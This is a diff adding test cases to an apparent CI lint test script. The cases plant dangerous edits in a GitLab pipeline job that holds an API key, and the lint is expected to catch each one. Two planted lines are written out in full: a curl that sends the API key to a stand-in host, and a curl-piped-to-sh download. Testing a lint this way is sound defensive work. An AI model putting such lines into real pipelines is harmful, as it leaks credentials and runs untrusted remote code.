@@ -707,6 +707,27 @@ split_case "import_docs scheduled on main, not dev (#129)" $ci "import_docs rule
   y = y.replace(/(import_docs:[\s\S]*?  rules:\n    - if: [^\n]*) && \$CI_COMMIT_BRANCH == "dev"\n/, "$1 \&\& \$CI_COMMIT_BRANCH == \"main\"\n");'
 split_case "publish_docs running npm" $ci "publish_docs runs npm" '
   y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - npm ci --prefix tools\n    - sh tools/ci/nightly-publish.sh\n");'
+# translate_docs holds the Anthropic API key (#125, review finding 3, and finding 4: the cap TRANSLATE_MAX_TOKENS is
+# read from the environment, so no line of .gitlab-ci.yml may set it for the job): it is judged as strictly as
+# publish_docs, which holds the import token. Each case plants one thing and the lint must name translate_docs with it.
+# (The key's name is joined in the edit: this file is read by the scan that finds the name in any other file.)
+split_case "t1: translate_docs sending the key out from an after_script" $ci "translate_docs.*after_script" '
+  const K = ["ANTHROPIC", "API", "KEY"].join("_");
+  y = y.replace("  script:\n    - sh tools/ci/nightly-translate.sh\n", () => "  script:\n    - sh tools/ci/nightly-translate.sh\n  after_script:\n    - curl -d \"$" + K + "\" https://example.invalid\n");'
+split_case "t2: translate_docs with a before_script that is not npm" $ci "translate_docs.*before_script" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-translate.sh\n", () => "  before_script:\n    - curl -sS https://example.invalid/x.sh | sh\n  script:\n    - sh tools/ci/nightly-translate.sh\n");'
+split_case "t3: translate_docs setting TRANSLATE_MAX_TOKENS in its variables" $ci "translate_docs.*variables" '
+  y = y.replace(/(translate_docs:[\s\S]*?  variables:\n    GIT_DEPTH: 1\n)/, (m) => m + "    TRANSLATE_MAX_TOKENS: \"900000000\"\n");'
+split_case "t4: translate_docs with a rule that sets variables" $ci "translate_docs.*(rules|variables)" '
+  y = y.replace(/(translate_docs:[\s\S]*?\$TRANSLATE == "true"[^\n]*\n)/, (m) => m + "      variables:\n        TRANSLATE_MAX_TOKENS: \"900000000\"\n");'
+split_case "t5: translate_docs with a key the job holding the key does not take (retry)" $ci "translate_docs.*retry|retry.*translate_docs" '
+  y = y.replace("translate_docs:\n  stage: maintenance\n", () => "translate_docs:\n  stage: maintenance\n  retry: 2\n");'
+split_case "t6: translate_docs run as a parallel matrix" $ci "translate_docs.*parallel" '
+  y = y.replace("translate_docs:\n  stage: maintenance\n", () => "translate_docs:\n  stage: maintenance\n  parallel: 2\n");'
+split_case "t7: translate_docs on a reused build folder (GIT_STRATEGY: fetch)" $ci "translate_docs.*(GIT_STRATEGY|variables)" '
+  y = y.replace(/(translate_docs:[\s\S]*?  variables:\n    GIT_DEPTH: 1\n)/, (m) => m + "    GIT_STRATEGY: fetch\n");'
+split_case "t8: TRANSLATE_MAX_TOKENS in the pipeline-wide variables" $ci "TRANSLATE_MAX_TOKENS" '
+  y = y.replace("\nvariables:\n  # The commit of the include above", () => "\nvariables:\n  TRANSLATE_MAX_TOKENS: \"900000000\"\n  # The commit of the include above");'
 split_case "the import script naming the token" tools/ci/nightly-import.sh "names the token" '
   y = y.replace("DRY_RUN=${DRY_RUN:-}\n", "DRY_RUN=${DRY_RUN:-}\ntoken=${ORBIT_SITE_IMPORT_TOKEN:-}\n");'
 split_case "the import script calling the API" tools/ci/nightly-import.sh "calls curl or git push" '
